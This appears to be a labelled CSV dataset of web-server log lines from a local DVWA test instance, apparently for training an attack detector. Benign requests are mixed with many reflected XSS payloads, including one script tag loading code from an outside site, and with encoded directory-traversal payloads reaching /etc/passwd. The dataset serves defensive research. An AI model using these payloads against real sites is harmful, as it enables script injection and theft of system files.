,url,normal,xss,dir
9240,"127.0.0.1 - - [03/May/2021:03:20:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Leroy HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
5744,"127.0.0.1 - - [03/May/2021:03:26:18 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Sika HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
6648,"127.0.0.1 - - [03/May/2021:03:21:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Makary HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
15642,"127.0.0.1 - - [03/May/2021:03:10:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Alidia HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
13492,"127.0.0.1 - - [03/May/2021:02:35:14 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;"" 400 0 ""-"" ""-""",0,1,0
4151,"127.0.0.1 - - [03/May/2021:03:15:28 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Enrika HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
8740,"127.0.0.1 - - [03/May/2021:03:07:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=perl HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2441,"127.0.0.1 - - [03/May/2021:02:35:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script src=http://yoursite.com/your_files.js></script>"" 400 0 ""-"" ""-""",0,1,0
2172,"127.0.0.1 - - [03/May/2021:03:41:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tbody onbeforecopy=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
16552,"127.0.0.1 - - [03/May/2021:03:21:41 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Marilyn HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
3701,"127.0.0.1 - - [03/May/2021:03:20:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Lorette HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
12444,"127.0.0.1 - - [03/May/2021:03:23:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Nazib HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
14821,"127.0.0.1 - - [03/May/2021:02:35:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param"" 400 0 ""-"" ""-""",0,1,0
5214,"127.0.0.1 - - [03/May/2021:03:06:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=local HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
12294,"127.0.0.1 - - [03/May/2021:03:24:19 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Prissie HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
19203,"127.0.0.1 - - [03/May/2021:03:27:08 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Teruko HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
12794,"127.0.0.1 - - [03/May/2021:03:25:52 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Shakoor HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
3084,"127.0.0.1 - - [03/May/2021:03:10:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Adoree HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
16696,"127.0.0.1 - - [03/May/2021:03:18:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Jodee HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
3947,"127.0.0.1 - - [03/May/2021:03:40:45 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<form id=x"" 400 0 ""-"" ""-""",0,1,0
11692,"127.0.0.1 - - [03/May/2021:02:34:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src=x\\x10onerror=\""javascript:alert(1)\"">"" 400 0 ""-"" ""-""",0,1,0
13435,"127.0.0.1 - - [03/May/2021:03:41:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<iframe src=%22404%22"" 400 0 ""-"" ""-""",0,1,0
20250,"127.0.0.1 - - [03/May/2021:03:23:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Nara HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1719,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<kbd oncut=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
14991,"127.0.0.1 - - [03/May/2021:03:25:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Rosemarie HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
19880,"127.0.0.1 - - [03/May/2021:03:25:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Selim HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
15086,"127.0.0.1 - - [03/May/2021:03:40:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<details id=x"" 400 0 ""-"" ""-""",0,1,0
20426,"127.0.0.1 - - [03/May/2021:03:10:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Alvinia HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1373,"127.0.0.1 - - [03/May/2021:03:41:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div id=\""114\""><x"" 400 0 ""-"" ""-""",0,1,0
15170,"127.0.0.1 - - [03/May/2021:03:41:27 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<svg><param onload=alert(1)></param>"" 400 0 ""-"" ""-""",0,1,0
11873,"127.0.0.1 - - [03/May/2021:03:11:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Astra HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
16385,"127.0.0.1 - - [03/May/2021:03:41:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<optgroup ondblclick=\""alert(1)\"">test</optgroup>"" 400 0 ""-"" ""-""",0,1,0
11699,"127.0.0.1 - - [03/May/2021:03:18:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Josefina HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
16008,"127.0.0.1 - - [03/May/2021:03:40:47 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<h1 oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
19726,"127.0.0.1 - - [03/May/2021:02:35:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<;DIV STYLE=\"";background-image:"" 400 0 ""-"" ""-""",0,1,0
6641,"127.0.0.1 - - [03/May/2021:03:40:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<isindex onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
15770,"127.0.0.1 - - [03/May/2021:03:41:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<table id=x"" 400 0 ""-"" ""-""",0,1,0
15419,"127.0.0.1 - - [03/May/2021:03:12:37 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Carmelia HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
7160,"127.0.0.1 - - [03/May/2021:03:40:47 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<hr draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
15519,"127.0.0.1 - - [03/May/2021:03:16:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Guenevere HTTP/1.1"" 200 1701 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
14363,"127.0.0.1 - - [03/May/2021:03:13:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Collette HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9239,"127.0.0.1 - - [03/May/2021:03:28:00 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Vinny HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
10418,"127.0.0.1 - - [03/May/2021:03:40:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<dfn onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
1392,"127.0.0.1 - - [03/May/2021:03:06:52 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=ldap HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
19620,"127.0.0.1 - - [03/May/2021:03:17:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Hsieh HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9062,"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr onmousemove=\""alert(1)\"">test</tr>"" 400 0 ""-"" ""-""",0,1,0
4548,"127.0.0.1 - - [03/May/2021:03:06:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=hasi HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
162,"127.0.0.1 - - [03/May/2021:03:05:18 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=aupa HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
19170,"127.0.0.1 - - [03/May/2021:10:24:07 -0400] ""GET /DVWA/vulnerabilities/fi/?page=import.php HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
13147,"127.0.0.1 - - [03/May/2021:03:08:06 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=srchad HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1920,"127.0.0.1 - - [03/May/2021:03:17:06 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Gwendolen HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
15875,"127.0.0.1 - - [03/May/2021:03:41:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div id=\""121\""><html"" 400 0 ""-"" ""-""",0,1,0
6824,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<param onmousedown=\""alert(1)\"">test</param>"" 400 0 ""-"" ""-""",0,1,0
4103,"127.0.0.1 - - [28/Apr/2021:22:31:08 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%00%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
11040,"127.0.0.1 - - [03/May/2021:10:22:17 -0400] ""GET /DVWA/ HTTP/1.1"" 200 2812 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file3.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
19194,"127.0.0.1 - - [03/May/2021:03:41:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tbody onmouseenter=\""alert(1)\"">test</tbody>"" 400 0 ""-"" ""-""",0,1,0
15048,"127.0.0.1 - - [03/May/2021:03:14:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Deeanne HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
5309,"127.0.0.1 - - [03/May/2021:10:06:18 -0400] ""GET /DVWA/vulnerabilities/fi/?page=..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fetc0x2fpasswd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
9993,"127.0.0.1 - - [03/May/2021:03:16:19 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Gabriel HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9031,"127.0.0.1 - - [03/May/2021:02:35:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=</XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))> HTTP/1.1"" 200 1730 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
13239,"127.0.0.1 - - [03/May/2021:02:34:58 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<STYLE TYPE=\""text/javascript\"">alert('XSS');</STYLE>"" 400 0 ""-"" ""-""",0,1,0
18781,"127.0.0.1 - - [03/May/2021:03:40:50 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img id=x"" 400 0 ""-"" ""-""",0,1,0
16440,"127.0.0.1 - - [03/May/2021:10:05:17 -0400] ""GET /DVWA/vulnerabilities/fi/?page=..%c0%afetc%c0%afpasswd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
5456,"127.0.0.1 - - [03/May/2021:03:06:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=function HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
20500,"127.0.0.1 - - [03/May/2021:03:40:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<x oncopy=alert(1)>copy"" 400 0 ""-"" ""-""",0,1,0
11657,"127.0.0.1 - - [03/May/2021:03:40:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<del onmousedown=\""alert(1)\"">test</del>"" 400 0 ""-"" ""-""",0,1,0
17796,"127.0.0.1 - - [03/May/2021:02:34:48 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<iframe onbeforeload"" 400 0 ""-"" ""-""",0,1,0
15578,"127.0.0.1 - - [03/May/2021:03:25:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Sandy HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
8131,"127.0.0.1 - - [03/May/2021:03:16:20 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Gabriellia HTTP/1.1"" 200 1701 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
13843,"127.0.0.1 - - [03/May/2021:03:26:37 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Sterling HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
7611,"127.0.0.1 - - [03/May/2021:03:21:46 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Marjie HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
14629,"127.0.0.1 - - [03/May/2021:03:07:39 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=rachmaninoff HTTP/1.1"" 200 1703 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2797,"127.0.0.1 - - [03/May/2021:03:14:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Dolli HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2134,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<listing onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
16528,"127.0.0.1 - - [03/May/2021:03:26:10 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Shoeb HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
4280,"127.0.0.1 - - [03/May/2021:03:14:02 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Daphine HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
4566,"127.0.0.1 - - [03/May/2021:03:28:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Wendy HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
11163,"127.0.0.1 - - [03/May/2021:03:23:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Paulus HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
5721,"127.0.0.1 - - [03/May/2021:03:13:58 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Dania HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
16100,"127.0.0.1 - - [03/May/2021:03:25:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Rozalia HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
906,"127.0.0.1 - - [03/May/2021:03:23:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Norine HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
14396,"127.0.0.1 - - [03/May/2021:03:19:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Khanh HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
6718,"127.0.0.1 - - [03/May/2021:03:41:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<var draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
13447,"127.0.0.1 - - [03/May/2021:03:12:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Carlin HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
7833,"127.0.0.1 - - [03/May/2021:03:41:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<pre onpaste=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
